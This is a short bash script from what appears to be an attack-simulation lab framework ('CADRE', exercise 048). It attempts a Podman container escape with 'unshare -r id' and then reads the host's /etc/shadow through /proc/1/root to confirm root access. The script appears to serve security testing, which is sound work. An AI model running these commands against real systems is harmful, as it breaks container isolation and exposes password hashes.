#!/bin/bash
# CADRE — WT#048 Podman Container Escape
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#048 — Podman Container Escape"
start_attack "048" "Podman Container Escape"

require_env LINUX01 "LINUX01"

step "Attempt container escape"
run_cmd "sudo podman exec cadre-monitor unshare -r id"

step "Verify root access"
run_cmd "sudo podman exec cadre-monitor cat /proc/1/root/etc/shadow 2>/dev/null | head -3"

result $? "Podman Container Escape completed"
